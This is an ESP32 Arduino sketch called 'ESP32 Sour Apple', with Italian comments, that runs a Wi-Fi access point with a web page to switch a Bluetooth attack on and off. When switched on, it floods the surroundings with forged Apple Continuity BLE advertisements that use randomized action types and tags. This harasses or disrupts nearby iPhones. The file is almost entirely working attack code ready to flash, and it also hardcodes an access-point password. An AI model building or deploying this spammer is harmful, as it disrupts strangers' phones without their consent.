#include <WiFi.h>
#include <WebServer.h>
#include <NimBLEDevice.h>

NimBLEAdvertising *pAdvertising;

/* Put your SSID & Password */
const char* ssid = "Iphone di Esp";  // Enter SSID here
const char* password = "Canguro.15";  //Enter Password here

/* Put IP Address details */
IPAddress local_ip(192,168,1,1);
IPAddress gateway(192,168,1,1);
IPAddress subnet(255,255,255,0);

WebServer server(80);

bool status = LOW;

void setup() {
  Serial.begin(115200);
  
  /* BLUETOOTH */
  NimBLEDevice::init("");
  NimBLEServer *pServer = NimBLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  /* WIFI */
  WiFi.softAP(ssid, password);
  WiFi.softAPConfig(local_ip, gateway, subnet);
  delay(100);
  
  server.on("/", handle_OnConnect);
  server.on("/on", handle_on);
  server.on("/off", handle_off);

  server.onNotFound(handle_NotFound);
  
  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  server.handleClient();
  
  /*BLUETOOTH*/
  if(status == true){
    Serial.println("STO SPAMMANDOO ");
    delay(40);
    NimBLEAdvertisementData advertisementData = getOAdvertisementData();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
  }

}

void handle_OnConnect() {
  status = LOW;
  server.send(200, "text/html", SendHTML(status)); 
}

void handle_on() {
  status = HIGH;
  accendiIphone();
  server.send(200, "text/html", SendHTML(true)); 
}

void handle_off() {
  status = LOW;
  spegniIphone();
  server.send(200, "text/html", SendHTML(false)); 
}

void handle_NotFound(){
  server.send(404, "text/plain", "Not found");
}

String SendHTML(uint8_t led1stat){
  String ptr = "<!DOCTYPE html> <html>\n";
  ptr +="<head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\">\n";
  ptr +="<title>LED Control</title>\n";
  ptr +="<style>html { font-family: Helvetica; display: inline-block; margin: 0px auto; text-align: center;}\n";
  ptr +="body{margin-top: 50px;} h1 {color: #444444;margin: 50px auto 30px;} h3 {color: #444444;margin-bottom: 50px;}\n";
  ptr +=".button {display: block;width: 80px;background-color: #3498db;border: none;color: white;padding: 13px 30px;text-decoration: none;font-size: 25px;margin: 0px auto 35px;cursor: pointer;border-radius: 4px;}\n";
  ptr +=".button-on {background-color: #3498db;}\n";
  ptr +=".button-on:active {background-color: #2980b9;}\n";
  ptr +=".button-off {background-color: #34495e;}\n";
  ptr +=".button-off:active {background-color: #2c3e50;}\n";
  ptr +="p {font-size: 14px;color: #888;margin-bottom: 10px;}\n";
  ptr +="</style>\n";
  ptr +="</head>\n";
  ptr +="<body>\n";
  ptr +="<h1>ESP32 Sour Apple</h1>\n";
  ptr +="<h3>Using Access Point Mode</h3>";
  ptr +="<p>by SERRINH0</p>\n\n\n";
  
   if(led1stat)
  {ptr +="<p>Status: ON</p><a class=\"button button-off\" href=\"/off\">OFF</a>\n";}
  else
  {ptr +="<p>Status: OFF</p><a class=\"button button-on\" href=\"/on\">ON</a>\n";}

 
  ptr +="</body>\n";
  ptr +="</html>\n";
  return ptr;
}

void accendiIphone() {
  Serial.println("SONO ACCESO");
}

void spegniIphone() {
  Serial.println("SONO SPENTO");
}

/*BLUETOOTH*/
NimBLEAdvertisementData getOAdvertisementData() {
  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;   
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}
